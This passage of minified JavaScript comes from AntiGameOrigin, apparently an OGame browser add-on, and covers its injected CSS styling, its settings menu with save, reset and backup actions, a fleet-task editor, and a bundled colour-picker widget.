q.color.textLimeGreen)+" ! important; }",".ago_color_planet { color: "+q.color.textLimeGreen+" ! important; }",".ago_color_moon { color: "+q.color.textLimeOrange+" ! important; }",".ago_color_debris { color: "+q.color.textWhite+" ! important; }",".ago_color_shortkey { color: "+q.color.textBlueNote+"; }",".ago_target, .ago_target:link { color: "+q.color.textBlue+"; }",".ago_target:hover { background-color: #212A33; border-radius: 3px; }",".ago_target.ago_planet:hover { color: "+q.color.textLimeGreen+
"; }",".ago_target.ago_moon:hover { color: "+q.color.textLimeOrange+"; }",".ago_target_locked { color: "+q.color.textPaleRed+"; }",".ago_target_current { color: "+(e.type===Y?q.color.textLimeOrange:q.color.textLimeGreen)+"; }",".ago_panel_view { cursor: help; }",".ago_panel_view:hover { background-color: #212A33; border-radius: 3px; }",".ago_feedback { box-shadow: 0 0 3px 2px #FF9600, 0 0 1px 1px #FF9600 inset; border-radius: 5px; }",".ago_feedback_planet { box-shadow: 0 0 2px 1px #99CC00; border-radius: 5px; }",
".ago_feedback_moon { box-shadow: 0 0 2px 1px #FF9600; border-radius: 5px; }",".ago_feedback_debris { box-shadow: 0 0 2px 1px #FFFFFF; border-radius: 5px; }",".ago_feedback.ago_target { box-shadow: 0 0 3px 2px #FF9600, 0 0 1px 1px #FF9600 inset; border-radius: 3px; }",".ago_feedback.ago_target.ago_planet { box-shadow: 0 0 2px 1px #99CC00; border-radius: 3px; }",".ago_feedback.ago_target.ago_moon { box-shadow: 0 0 2px 1px #FF9600; border-radius: 3px; }","#fleet2.ago_planet #start .planetname { color: "+
q.color.textLimeGreen+"; }","#fleet2.ago_moon #start .planetname { color: "+q.color.textLimeOrange+"; }",".ago_text_background { background-color: rgba(0, 0, 0, 0.65); }",".ago_text_background_dark { background-color: rgba(12, 16, 20, 0.90); }","span.anti_shortcut { color: "+q.color.textBlueNote+"; font-size: 11px; font-weight: 700; }","#cluetip-inner span.anti_shortcut { float: left; }",'.ago_display_arrow { background: url("/cdn/img/layout/fleetCloseAll.gif") no-repeat scroll 0 0 transparent; display: inline-block; height: 22px; width: 22px; cursor: pointer; }',
'[ago_display_status="1"] .ago_display_arrow { background-image: url("/cdn/img/layout/fleetOpenAll.gif"); }']);e.is("A26")&&q.setCache([".smallplanet .planetlink.active { background-color: rgba( 153, 204, 0, 0.11); border-radius: 5px; }",".smallplanet.ago_planets_planet_selected .planetlink { background-color: rgba( 153, 204, 0, 0.22) ! important; border-radius: 5px; }",".smallplanet.ago_planets_moon_active .planetlink { background-color: rgba( 255, 150, 0, 0.11); border-radius: 5px; }",".smallplanet.ago_planets_moon_selected .planetlink { background-color: rgba( 255, 150, 0, 0.22) ! important; border-radius: 5px; }",
"#rechts .planetlink:hover { box-shadow: 0 0 2px 0px #99CC00; border-radius: 5px; }","#rechts .ago_planets_moon_hover .planetlink { box-shadow: 0 0 2px 0px #FF9600; border-radius: 5px; }"]);var a=[],b=n.d(e.get("CS2")||100),c,d;for(d=21;79>=d;d++)(c=e.getColor("C"+d))&&a.push("."+e.getMore("C"+d)+" { color: "+c+" !important; }","."+e.getMore("C"+d)+"_back { background-color: "+e.getColor("C"+d,b)+" !important; }");b=n.d(e.get("CC2")||100);for(d=81;99>=d;d++)(c=e.getColor("C"+d))&&a.push("."+e.getMore("C"+
d)+" { color: "+c+" !important; }","."+e.getMore("C"+d)+"_back { background-color: "+e.getColor("C"+d,b)+" !important; }");q.setCache(a);e.is("A26")&&q.setCache(['input[type="text"]:focus, .dropdown a:focus { box-shadow: 0 0 4px 3px #6F9FC8; border-radius: 3px; }']);q.setCache(["#star, #star1, #star2, #changelog_link { display: none; }",".ago_clock { color: #848484; font-size: 11px; font-weight: 700; position: absolute; right: 0px; text-align: right; top: 21px; }",".ago_clock span { display: inline-block; width: 144px; }",
"#ago_icon { width: 250px; height: 58px; position: absolute; top: 0px; left: -200px; display: inline-block; }","#ago_icon .ago_icon { width: 27px; height: 27px; position: absolute; top: 24px; right: 8px; }",".adviceWrapper { margin-top: 0px; }","a#ago_menu_icon { height: 29px; width: 38px; text-align: left; padding-left: 4px; background: url(data:image/gif;base64,R0lGODlhJgAdAOYAAAAAABwgJTU4OhwhJRYaHjQ3OQcICjM2OA8SFQoMDxsgJB0hJjI1Nw8TFQcICAQEBDE0NgwPEAECAiYoKREVGB8lKi4yNCMlJgoNDzAzNiMnKzE0NxATFgsNECwuMAEBASotMB4iJyImKg8SFg4PDw8QESEjJQICAiAkKRgZGhsdHhUWFwoLCwoMDjI2OBcbHxsgIw0PEhsfIx8jJywvMh8hIhobHB8kKQkMDQYICQoNECwwMxcZGQsOER0iJygrLxweHysuMSUoLAkLDiQnKwwPESElKTM2NyAiIwcKCyAjJxoeISIlKiIkJRIWGRQWFiosLSUnKDAzNBscHRoeIgMEBDAyNA4ODyAkKAcICQkKCwwQEiMnKhwgJBIVGRAQEScqLiosLgcJCgcJCzQ2OAQEBQgICAkJCiksMCQmJwYHCSAjKC0vMQYGBh4jJyUpLSksLRAUFygsLzM2OSsuLyotMQwNDTAzNS4xMiwvMAkJDAkLDS0wMy0xMyQoLAc6VCH5BAEAAH8ALAAAAAAmAB0AAAfngH+CFQOFhoeIiRWCjI2ON4cBkpKIlIgVMI6af4SFk5+gk5UwBJuNBIahqqs+paaCBKuyoG4BA66vBFSzvAEKAbimsb2zCgrBm8PEq8bImsrLoV23r7Ay0bLOjgTX2Krap9Deki/gjGIE6eLE6lnVfwDx8vP09fXv9vn68vj7/vT9/gkMKFCfBAAEC+pLqNAew4YAq+U7CPEhAIoN3+UAoAaiw2pDcOwJOSaJgZMo9Z3MoUXPuz9bYhQp0qODTQw4E+hssVOHDgA9Igh9KciJlzhxOChtgIBp0xFPo1KgQLSq1atYiQYCADs%3D) no-repeat scroll 0 0 transparent; display: block; }",
"#links .leftmenu li.ago_menu_info { display: none; background: none; background-color: "+q.color.backMenu+"; border: 1px solid #000000; border-radius: 3px; width: 168px; height: auto; font-size: 11px; text-align: center; }",".ago_jumpgate_cooldown { font-size: 9px; line-height: 10px; padding: 0 1px 1px 1px; color: "+q.color.textLimeOrange+"; border: 0px solid "+q.color.textLimeOrange+"; }",".ago_jumpgate_cooldown:not(:empty) { background-color: #000000; border-radius: 3px; border-width: 1px; }",
".ago_jumpgate_cooldown_seconds { color: "+q.color.textLimeGreen+";  border-color: "+q.color.textLimeGreen+"; }"]);e.is("O50")&&(q.setCache([".ago_planets_arrow { display: inline-block; height: 28px; width: 28px; cursor: pointer; position: absolute; }",'.ago_planets_arrow:hover { background: url("/cdn/img/layout/fleetOpenAll.gif") no-repeat scroll center center transparent; }',".ago_planets_moon_active a.planetlink:not(:hover) span.planet-name, .ago_planets_moon_active a.planetlink:not(:hover) span.planet-koords { color: "+
q.color.textLimeOrange+" !important; }",".ago_planets_moon_hover span.planet-name, .ago_planets_moon_hover span.planet-koords { color: "+q.color.textLimeOrange+" !important; }",".ago_planets_construction, .ago_planets_construction_moon { font-size: 9px; line-height: 9px; color: "+q.color.textNormal+"; position: absolute; white-space: nowrap; }","#myPlanets .ago_jumpgate_cooldown { position: absolute; left: 2px; top: -9px; }","#myWorlds .ago_jumpgate_cooldown { position: absolute; left: -2px; top: -10px; }",
".ago_planets_shortcut { font-size: 10px; color: "+q.color.textLight+"; position: absolute; top: 22px; right: -4px; }","#myWorlds .ago_planets_shortcut { font-size: 11px; top: 68px; right: 0; }","#rechts #myPlanets .active span.planet-name { font-size: 12px; font-weight: normal; }","#rechts #myPlanets .active span.planet-koords { font-size: 10px; font-weight: normal; }","#rechts a.planetlink.active .planetPic { box-shadow: 0 0 6px 1px #99CC00, 0 0 3px 4px #99CC00 inset; }","#rechts a.planetlink:hover .planetPic, #rechts a.planetlink:active .planetPic { box-shadow: 0 0 2px 1px #99CC00, 0 0 1px 0px #99CC00 inset; }",
"#rechts a.moonlink:hover .icon-moon, #rechts a.moonlink:active .icon-moon { box-shadow: 0 0 3px 1px #FF9600, 0 0 1px 1px #FF9600 inset; }"]),e.is("O51")?q.setCache(["#myWorlds, #rechts .smallplanet { width: 147px; }","#rechts .smallplanet { margin: 0 0 14px 0 }",".ago_planets_construction { left: 20px; top: -2px;}","#rechts #myWorlds .planetPic { width: 38px; height: 38px; position: relative; left: -50px; top: 10px; }","#rechts #myWorlds .smallplanet a.moonlink { width: 48px; height: 80px; left: 100px; top: 0px; padding: 4px 0 0 0; }",
"#rechts #myWorlds .smallplanet a.moonlink .icon-moon { width: 24px; height: 24px; position: relative; left: 5px; top: 12px; }","#rechts #myWorlds .smallplanet a.alert { left: 68px; top: 20px; }","#rechts #myWorlds .planet-name { padding-top: 9px; }","#rechts #myWorlds .smallplanet a.constructionIcon { left: 4px; top: 2px; }","#rechts #norm a.constructionIcon.moon { left: 135px; top: 36px; }","#rechts #myWorlds .ago_planets_construction_moon { right: 28px; top: 38px; }","#myWorlds .ago_jumpgate_cooldown { left: 8px; top: 18px; }",
"#myPlanets .planetPic { top: 12px; }","#rechts #myPlanets .smallplanet a.moonlink { width: 48px; height: 52px; left: 100px; top: 0px; padding: 4px 0 0 0; }","#rechts #myPlanets .smallplanet a.moonlink .icon-moon { width: 20px; height: 20px; position: relative; left: 0px; top: 18px; }","#rechts #myPlanets .smallplanet a.alert, #rechts #myPlanets .smallplanet a.alert:link { left: 4px; top: 32px; }","#rechts #myPlanets .smallplanet a.constructionIcon { left: 4px; top: 2px; }","#rechts #cutty a.constructionIcon.moon { left: 133px; top: 36px; }",
"#myPlanets .ago_jumpgate_cooldown { left: 8px; top: 22px; }","#rechts #myPlanets .ago_planets_construction_moon { right: 18px; top: 38px; }"]):q.setCache([".ago_planets_construction_moon { left: 36px; top: 38px; }","#rechts #myWorlds .ago_planets_construction { display: block; width: 100%; top: -1px;}","#rechts #myPlanets .ago_planets_construction { left: 32px; top: -1px;}"]),e.is("O52")&&q.setCache(["#countColonies { display: none; }","#rechts { margin-top: -56px; }"]));q.insertCache();H.styles();
q.insertCache();y.styles();q.insertCache();N.styles&&(N.styles(),q.insertCache());q.Sheet=document.createElement("style");q.Sheet.media="screen";q.Sheet.type="text/css";q.Sheet.setAttribute("rel","stylesheet");document.getElementsByTagName("head")[0].appendChild(q.Sheet)}},O={insertCSSRules:function(){var a=n.minMax(n.d(s.innerHeight)-300,400,700);q.setCache(["#anti_win { position: relative; z-index:2; margin-top: 2px; margin-bottom: 5px; width:664px; background-color: "+q.color.backMenu+"; border: 1px solid #000000; float: left; }",
"#galaxy #anti_win { top:-44px; }","#anti_win table { width: 100%; padding: 0; margin: 0; border-collapse: collapse; }","#anti_win table td { padding: 0; margin: 0; text-align: left; }","#anti_win #anti_title { padding: 7px 0; text-align:center; color: "+q.color.textBlue+"; font-size: 13px; font-weight: 700; background: url(/cdn/img/layout/eventList-header.gif) repeat-y scroll 0 0 #0D1014; }","#anti_win #anti_content { padding: 6px; height: "+a+"px; overflow-y:auto; }","#anti_win #anti_content .sectiontitle, #anti_win #anti_content .subsectiontitle { color: "+
q.color.textBlue+"; font-size: 12px; font-weight: 400; }","#anti_win #anti_content .sectiontitle { padding: 2px 0 2px 35%; margin: 1px 0; font-weight: 600; background:#13181D; border: 1px solid #000000; cursor: pointer; }","#anti_win #anti_content .sectiontitle:hover { background: #23282D; }","#anti_win .section > table { width: 98%; margin: 5px auto 15px auto;  }","#anti_win .section td { padding-top: 1px; padding-bottom: 2px; height:16px; color:"+q.color.textNormal+"; font-size:11px; }","#anti_win .section td.label { padding-left: 20px; padding-right: 4px; text-indent: -10px; }",
"#anti_win .section td.input { width: 220px; }","#anti_win .section .ago_menu_section_inactive"+(qa?" td":"")+" { opacity: 0.4; }","#anti_win .section .ago_menu_subsection_inactive"+(qa?" td":"")+" { opacity: 0.4; }","#anti_win .section .subsectionchange, #anti_win .section .sectionchange { position: relative; left: -22px; }","#anti_content .sectiontitle:not(.section_open) + table { display: none; }","#anti_content .sectiontitle:not(.section_open) .indicatorOpen { display: none; }","#anti_content .sectiontitle.section_open .indicator { display: none; }",
".anti_active_light { border: 1px solid #99CC00 !important; }","#anti_win .section table.input { padding: 0; margin: 0; }","#anti_win .section table.input td { padding: 0 3px; }","#anti_win #anti_footer { padding: 7px; border-top: 1px solid #000000; text-align: center; }","#anti_win #anti_footer table { width: 100%; text-align: center; padding-left: 110px; }","#anti_win #anti_footer td { min-width: 120px; padding: 0 10px; overflow: hidden; }",'#anti_win input[type="text"], #anti_win select, #anti_win option { padding: 0px 2px; font-size: 12px; color: '+
q.color.textNormal+";  visibility: visible; }",'#anti_win input[type="text"] { width: 102px; height: 16px; line-height: 16px; background: '+q.color.backGreen+"; color: "+q.color.textBrighter+"; }","#anti_win select { min-width: 126px; border: 0 none; }","#anti_win .anti_color, #anti_win .anti_task { height: 14px; display: inline-block;  border: 1px solid #000000; background: #13181D; text-align: center; white-space:nowrap; }","#anti_win .anti_color:hover, #anti_win .anti_task:hover { background: #23282D; }",
"#anti_win .anti_task { width: 100%; height: 16px; line-height: 16px; text-align: left; }","#anti_win .anti_task span { display: inline-block; padding: 0 4px; vertical-align: middle; }","#anti_win .indicator, #anti_win .indicatorOpen { color:#30AD45; }","#anti_win a { text-decoration:none; }","#anti_win .ago_menu_button { padding: 0px 7px; width: 200px; white-space: nowrap; overflow: hidden; }","#anti_win #anti_footer .ago_menu_button { padding: 3px 10px; width: 160px; }","#anti_win #anti_color_buttons .ago_menu_button { padding: 0px 5px; width: 50px; }",
"#anti_win #ago_menuEdit .ago_menu_button { padding: 0px 5px; width: 100px; }","#anti_win .ago_menu_help, #anti_win .ago_menu_setting_help { cursor: help; }",".htmlTooltip ol { list-style-position: outside; list-style-type: disc; margin: 0px 5px 8px 25px; }",".htmlTooltip ol > li { padding: 2px 0; font-size: 11px; line-height: 16px; }",".htmlTooltip li span { color: "+q.color.textBlue+"; }",".htmlTooltip li span.ago_menu_help_option { color: "+q.color.textNormal+"; background-color: black; padding: 1px 4px; margin: 10px 10px 0 0; display: inline-block; min-width: 120px; }",
".htmlTooltip li span.ago_menu_help_shortcut { color: "+q.color.textNormal+"; background-color: black; padding: 1px 4px; margin-right: 10px; display: inline-block; min-width: 50px; border-radius: 3px; }",".htmlTooltip li span.ago_menu_help_headline { color: #90B2D0; margin-right: 10px; display: block; }",'.htmlTooltip .ago_menu_help_list:before { content: "- "; display: inline; position: relative; left: -2px; }',".htmlTooltip li span.ago_menu_help_pages { color: "+q.color.textWhite+"; font-style: italic; }",
".htmlTooltip li span.ago_menu_help_missions { color: "+q.color.textWhite+"; font-style: italic; }",".htmlTooltip li span.ago_menu_help_ogame { color: "+q.color.textWhite+"; font-style: italic; }",".htmlTooltip li span.ago_menu_help_item { color: "+q.color.textWhite+"; font-style: italic; }",".htmlTooltip h2 { color: "+q.color.textBlue+"; line-height: 22px; font-size: 11px; font-weight: bold; }","#ago_menuEdit { margin: 1px; padding: 6px; position: absolute; top: 5px; left: 5px; display: none; z-index: 3; background-color: "+
q.color.backMenu+"; }","#anti_win #ago_menuEdit td { padding-top: 0px; padding-bottom: 1px; height:14px; color:"+q.color.textNormal+"; font-size:10px; }","#anti_win #ago_menuEdit td.label { width: 220px; padding-left: 20px; padding-right: 4px; }","#anti_win #ago_menuEdit td.input { width: 120px; font-size:10px; }",'#anti_win #ago_menuEdit input[type="text"], #anti_win #ago_menuEdit select, #anti_win #ago_menuEdit option { padding: 0px 2px; font-size: 11px; }',"#anti_win #ago_menuEdit .subsectiontitle { color: "+
q.color.textBlue+"; font-size: 11px; font-weight: 400; }","#anti_color { position: absolute; display: none; z-index: 3; background-color: "+q.color.backMenu+";}","#anti_color_buttons { padding: 7px; }","#anti_win #anti_color_input { width: 56px; padding: 1px 5px; text-align: center; }","#anti_win #anti_color_none { width: 46px; padding: 0 5px; margin-right: 18px; }","#anti_win #anti_color_close { width: 16px; height: 16px; display: inline-block; float: right; background: transparent url(/cdn/img/layout/detail-spriteset.gif) no-repeat scroll -207px 0px; }",
".farbtastic { position: relative; }",".farbtastic * { position: absolute; cursor: crosshair; }",".farbtastic, .farbtastic .wheel { width: 195px; height: 195px; }",".farbtastic .color, .farbtastic .overlay { top: 47px; left: 47px; width: 101px; height: 101px; }",".farbtastic .wheel { background: url(http://antigame.de/antigame/images/color_wheel.png) no-repeat; }",".farbtastic .overlay { background: url(http://antigame.de/antigame/images/color_mask.png) no-repeat; }",".farbtastic .marker { width: 17px; height: 17px; margin: -8px 0 0 -8px; overflow: hidden; background: url(http://antigame.de/antigame/images/color_marker.png) no-repeat; }"],
!0)},Hide:function(a){var b;if(a){e.set("S16",1);e.set("S17",1);m.setStorage("Versions",e.getDataString("Versions",m.Info.Versions.timestamp));a=g("#anti_content input, #anti_content select, #anti_content a.anti_color, #anti_content a.anti_task");for(var c=0;c<a.length;c++){b=a.eq(c);var d=b.attr("id").split("_")[1],j=b.attr("id").split("_")[2];if(d&&e.Data[d]&&5===e.Data[d][3]){var t=e.Data[d][X];t===u?e.set(d,b.attr("checked")):t===ea?e.set(d,b.attr("valueColor")):t===M?j||(j=g("#"+b.attr("id")+
"_Opacity").val()||"",j=(b.attr("valueColor")||"")+(0<j&&100>j?"|"+j:""),e.set(d,j)):t===x?j||(b=(b.val()||"")+r.wrap("|",g("#"+b.attr("id")+"_Pair").val()),e.set(d,b)):t===ca?(t=b.attr("valueName"),b=f.splitTask(b.attr("valueTask"),ba,za),t&&(b=r.wrap(t+"=",f.joinTask(b,ba)),n.parseIntAbs(j)?b&&e.set(d,r.wrap("",e.get(d),";")+b):e.set(d,b))):e.set(d,b.val())}}"-"===e.get("A06")&&e.set("A06","");m.setStorage("Options",e.getDataString("Options"));B.updateInfo("Options",4,"","D06");e.setOptionsLive();
e.is("S80")&&m.setBackup("Options")}g("#anti_win").remove();g("#inhalt").show()},clickSectionTitle:function(){var a=g(this).hasClass("section_open");g("#anti_content .sectiontitle").removeClass("section_open");a||g(this).addClass("section_open")},actionButton:function(a){if(a&&a.target&&a.target.id)switch(a.target.id.replace(/anti_action_/g,"")){case "updatePara":ja||e.Check(!0,!0);break;case "resetData":confirm("AntiGameOrigin \n \n "+e.label("D4C"))&&(f.resetUnits(),m.resetStatus(),m.resetGalaxy(),
O.Hide());break;case "resetOptions":confirm("AntiGameOrigin \n \n "+e.label("S7C"))&&(m.deleteStorage("Options"),m.deleteStorage("OptionsLive"),O.Hide());break;case "resetDataBase":confirm("AntiGameOrigin \n \n "+e.label("D2C"))&&(I.Delete("Players"),I.Delete("Universe"),O.Hide());break;case "restoreBackup":confirm("AntiGameOrigin \n \n "+e.label("S89"))&&(e.set("S81",g("#Anti_S81").val()),m.restoreBackup());break;case "readBackup":if(a=g("#anti_action_textBox").val())m.setBackupString(a),O.Update(1);
break;case "save":O.Hide(1);break;case "cancel":O.Hide();break;case "saveTarget":O.hideTask(1);break;case "cancelTarget":O.hideTask()}},changeColor:function(a){if(a&&a.target&&a.target.id){var b=a.target.id.split("_")[1];b&&e.Data[b]&&(b=e.Data[b][X]===M?"#"+a.target.id+"_Opacity":"",g.farbtastic("#anti_color").linkTo("","#"+a.target.id,b))}},changeSection:function(a){var b=a&&a.target&&a.target.id?a.target.id.split("_")[1]:"";if(b&&e.Data[b])for(var b=g(this).attr("checked"),c=g(this).parent().parent().parent(),
d=g(c).attr("rel");!(c=g(c).next(),!c.length||g(c).hasClass("section")||g(c).hasClass("subsection")&&g(c).attr("rel")!==d);)b?g(c).removeClass("ago_menu_section_inactive"):g(c).addClass("ago_menu_section_inactive");O.changeSubsection(a)},changeSubsection:function(a){if((a=a&&a.target&&a.target.id?a.target.id.split("_")[1]:"")&&e.Data[a]){a=g(this).attr("checked");for(var b=g(this).parent().parent().parent();!(b=g(b).next(),!b.length||g(b).hasClass("subsection"));)a?g(b).removeClass("ago_menu_subsection_inactive"):
g(b).addClass("ago_menu_subsection_inactive")}},showOptions:function(){var a=n.d(this.value),a=1===a?m.getStorage("Options"):2===a?e.getDataString("Options","",10):3===a?e.getDataString("Options","","C"):4===a?e.getDataString("Options","","H"):5===a?e.getDataString("Options","","M"):11===a?m.getStorage("Galaxy"):12===a?m.getStorage("Status"):"";g("#anti_action_textBox").val(a)},changeBackup:function(){var a=g("#Anti_S80").attr("checked")?"AM3":"AM1";g("#anti_action_save").text(e.label(a))},changeTask:function(a){function b(a,
b){n+='<tr class="subsection"><td class="subsectiontitle">'+e.label(a)+':</td><td class="subsectiontitle">'+r.d(b)+"</td></tr>"}function c(a,b){n+='<tr><td class="label">'+e.label(a)+'</td><td class="input"><input id="ago_menuEdit_'+b+'" type="text" value="'+r.d(l[b])+'"></td></tr>'}function d(a,b,c,d){n+='<tr><td class="label">'+e.label(a)+'</td><td><select id="ago_menuEdit_'+b+'">';for(var j in d)d[j]&&(n+='<option value="'+j+'" '+(c==j?' selected="selected">':">")+e.label(d[j])+"</option>");n+=
"</select></td></tr>"}function j(a){a=a||"8";n+='<tr><td style="font-size: '+a+"px; line-height: "+a+"px; height: "+a+'px;" colspan="2">&nbsp;</td></tr>'}function t(a,b){return'<a class="btn_blue ago_menu_button anti_button_action" id="anti_action_'+b+'" href="javascript:void(0)">'+e.label(a)+"</a>"}var v,h,k;g("#ago_menuEdit > table").length&&O.hideTask();a=a&&a.currentTarget&&a.currentTarget.id?a.currentTarget.id:"";var m=a.split("_")[1];if(m&&e.Data[m]){var m=e.getMore(m,"TRS"),l=f.splitTask(g(this).attr("valueTask"),
ba,za);h=g(this).attr("valueName");var n="";"standard"===h?h=e.label("AT1"):(h=r.d(h).split(":"),h=r.d(h[0])+":"+r.d(h[1])+":"+r.d(h[2])+("3"===h[3]?" "+w.IMG(w.urlTypeIcon(3),14):""));b("AT0",h);j();if(0<=m.indexOf("T")){n+='<tr><td class="label">'+e.label("AT4")+'</td><td class="input"><input id="ago_menuEdit_galaxy" type="text" style="width: 20px;" value="'+r.d(l.galaxy)+'"> <input id="ago_menuEdit_system" type="text" style="width: 30px;" value="'+r.d(l.system)+'"> <input id="ago_menuEdit_position" type="text" style="width: 20px;" value="'+
r.d(l.position)+'"></td></tr>';k=" - ;LM01;LM02;LM03;LM04;LM05;LM06;LM07;LM08;LM09;;;;;;LM15".split(";");h="";0<=m.indexOf("E")?(c("ATT","rangeCoords"),j(),l.type=0,l.mission=15,k={15:"LM15"},h="E"):(0<=m.indexOf("C")?(j(),k=[" - ","","","LM03","LM04"],h="C"):0<=m.indexOf("F")&&j(),d("AT5","type",l.type,[" - ","L081","L082","L083"]));d("AT6","mission",l.mission,k);d("AT7","speed",l.speed," - ;10%;20%;30%;40%;50%;60%;70%;80%;90%;100%".split(";"));d("AT8","holdingtime",l.holdingtime,{"0":" - ","-1":"0",
1:"1",2:"2",4:"4",8:"8",16:"16",32:"32"});v=[" - "];for(k=1;20>=k;k++)v[k]=r.d(k);d("AT9","expeditiontime",l.expeditiontime,v);h&&(j(),J.check(h,"E","C")&&d("ATC","preferCargo",l.preferCargo,{"0":" - ",202:"L202",203:"L203"}),J.check(h,"E")&&d("ATS","preferShip",l.preferShip,{"0":" - ",204:"L204",205:"L205",206:"L206",207:"L207",211:"L211",213:"L213",215:"L215"}));j()}if(0<=m.indexOf("M")){v={"-":" - "};for(k in f.Planets)f.Planets[k].type===Y&&(v[f.Planets[k].coords]=f.Planets[k].coords);d("AT4",
"coords",l.coords,v)}0<=m.indexOf("R")&&(b("AT2"),c("L091","metal"),c("L092","crystal"),c("L093","deuterium"),d("ATR","preferResource",l.preferResource,[" - ","L091","L092","L093"]),j());if(0<=m.indexOf("S")){b("AT3");v=[202,203,204,205,206,207,208,209,210,211,213,214,215];for(k=0;k<v.length;k++)c("L"+v[k],v[k],l)}j(14);n+="<tr><td>"+t("AM2","cancelTarget")+"</td><td>"+t("AM1","saveTarget")+"</td></tr>";g("#ago_menuEdit").show().attr("ago_menuEdit_id",a).html(w.TABLE("","","380px",0,0,n));g("#ago_menuEdit .anti_button_action").bind("click",
O.actionButton);g("#ago_menuEdit #ago_menuEdit_mission").bind("change",function(){g("#ago_menuEdit_holdingtime, #ago_menuEdit_expeditiontime").parent().parent().hide();5===+g(this).val()&&g("#ago_menuEdit_holdingtime").parent().parent().show();15===+g(this).val()&&g("#ago_menuEdit_expeditiontime").parent().parent().show()}).change();g("#"+a).addClass("anti_active_light");g("body").unbind("mousedown",O.hideTask).bind("mousedown",O.hideTask)}},hideTask:function(a){if(!a||!a.target||!h.hasParentsId(a.target,
"ago_menuEdit",7)){var b=g("#ago_menuEdit").attr("ago_menuEdit_id")||"",c=b.split("_")[1];if(1===a&&c&&e.Data[c]){a={};for(var c=g("#ago_menuEdit input, #ago_menuEdit select"),d=0;d<c.length;d++){var j=(g(c[d]).attr("id")||"").split("_")[2];j&&(a[j]="checkbox"===g(c[d]).attr("type")?g(c[d]).attr("checked")?1:0:n.d(g(c[d]).val()))}g("#ago_menuEdit_coords").length&&(c=(g("#ago_menuEdit_coords").val()||"").split(":"),3===c.length&&(f.updateCoords(a,"",ta,n.d(c[0]),n.d(c[1]),n.d(c[2])),a.type=Y));5!==
a.mission&&(a.holdingtime=0);15!==a.mission&&(a.expeditiontime=0);a=f.joinTask(a,ba);g("#"+b).attr("valueTask",a);g("#"+b).html(O.createTask(f.splitTask(a,ba,za)))}g("#"+b).removeClass("anti_active_light");g("body").unbind("mousedown",O.hideTask);g("#ago_menuEdit").hide();g("#ago_menuEdit > table").remove()}},createTask:function(a){return(a.galaxy||a.system||a.position?'<span style="width: 52px">'+r.d(a.galaxy,"- ")+":"+r.d(a.system," - ")+":"+r.d(a.position," -")+"</span>":'<span style="width: 52px"> </span>')+
"<span>"+w.IMG(w.urlTypeIcon(a.type),14)+"</span><span>"+w.IMG(w.urlMissionIcon(a.mission),14)+'</span><span style="font-size: 9px; width: 30px">'+(0<a.speed&&10>a.speed?10*a.speed+"%":"")+'</span><span style="width: 20px">'+(a.resources?"R":"")+'</span><span style="width: 20px">'+(a.ships?"S":"")+"</span>"},Init:function(){O.status||(O.status=!0,O.insertCSSRules(),g.fn.farbtastic=function(a){g.farbtastic(this,a);return this},g.farbtastic=function(a,b){a=g(a).show().get(0);a.farbtastic||(a.farbtastic=
new g._farbtastic(a,b));g("body").unbind("mousedown",a.farbtastic.close).bind("mousedown",a.farbtastic.close);return a.farbtastic},g._farbtastic=function(a){var b=this;g(a).html('<div class="farbtastic"><div class="color"></div><div class="wheel"></div><div class="overlay"></div><div class="h-marker marker"></div><div class="sl-marker marker"></div></div><div id="anti_color_buttons"><a class="btn_blue ago_menu_button" id="anti_color_none" href="javascript:void(0)">'+e.label("None")+'</a><input id="anti_color_input" type="text" value=" "><a id="anti_color_close" href="javascript:void(0);"></a></div>');
var c=g(".farbtastic",a);b.wheel=g(".wheel",a).get(0);b.radius=84;b.square=100;b.width=194;b.linkTo=function(a,c,e){"object"===typeof b.callback&&g(b.callback).unbind("keyup",b.updateValue);b.color=null;a||(a="#anti_color_input");if("object"===typeof a||a&&"string"===typeof a)b.callbackStrg=a,b.callback=g(a),b.callback.bind("keyup",b.updateValue);c&&"string"===typeof c&&(b.colorTextStrg=c,b.colorText=g(c).addClass("anti_active_light"),e?(b.colorBack=g(e),b.colorOpacity=b.colorBack.eq(0).attr("valueOpacity")||
100):b.colorBack=null,b.colorStart=b.colorText.eq(0).attr("valueColor")||b.colorText.eq(0).attr("valueDefault"),b.colorStart&&b.setColor(b.colorStart));return this};b.close=function(c){if(c&&c.target&&(c=c.target.id?"#"+c.target.id:"",!c||c!==b.callbackStrg&&c!==b.colorTextStrg&&"#anti_color_buttons"!==c))"#anti_color_close"===c&&b.setColor(b.colorStart),"#anti_color_none"===c&&b.setColor(""),b.colorText&&b.colorText.removeClass("anti_active_light"),g("body").unbind("mousedown",b.close),g(a).hide()};
b.RGBtoHTML=function(a){if(1<a.indexOf("(")){var b,c="#";a=a.split("(")[1].split(")")[0].split(",");for(var e=0;e<a.length;e++)b=Number(a[e]).toString(16),c+=(1===b.length?"0":"")+b;return c.toUpperCase()}return a};b.updateValue=function(){this.value&&this.value!==b.color&&b.setColor(this.value)};b.setColor=function(a){if(b.color!==a){var c=b.unpack(a);c&&(b.color=a,b.rgb=c,b.hsl=b.RGBToHSL(b.rgb));b.updateDisplay()}return this};b.setHSL=function(a){b.hsl=a;b.rgb=b.HSLToRGB(a);b.color=b.pack(b.rgb);
b.updateDisplay();return this};b.widgetCoords=function(a){var c,e,f,h=a.target||a.srcElement,k=b.wheel;if("undefined"!==typeof a.offsetX){f={x:a.offsetX,y:a.offsetY};for(a=h;a;)a.mouseX=f.x,a.mouseY=f.y,f.x+=a.offsetLeft,f.y+=a.offsetTop,a=a.offsetParent;a=k;for(k=f=0;a;){if("undefined"!==typeof a.mouseX){c=a.mouseX-f;e=a.mouseY-k;break}f+=a.offsetLeft;k+=a.offsetTop;a=a.offsetParent}for(a=h;a;)a.mouseX=void 0,a.mouseY=void 0,a=a.offsetParent}else f=b.absolutePosition(k),c=(a.pageX||0*(a.clientX+
g("html").get(0).scrollLeft))-f.x,e=(a.pageY||0*(a.clientY+g("html").get(0).scrollTop))-f.y;return{x:c-b.width/2,y:e-b.width/2}};b.mousedown=function(a){document.dragging||(g(document).bind("mousemove",b.mousemove).bind("mouseup",b.mouseup),document.dragging=!0);var c=b.widgetCoords(a);b.circleDrag=2*Math.max(Math.abs(c.x),Math.abs(c.y))>b.square;b.mousemove(a);return!1};b.mousemove=function(a){var c=b.widgetCoords(a);b.circleDrag?(a=Math.atan2(c.x,-c.y)/6.28,0>a&&(a+=1),b.setHSL([a,b.hsl[1],b.hsl[2]])):
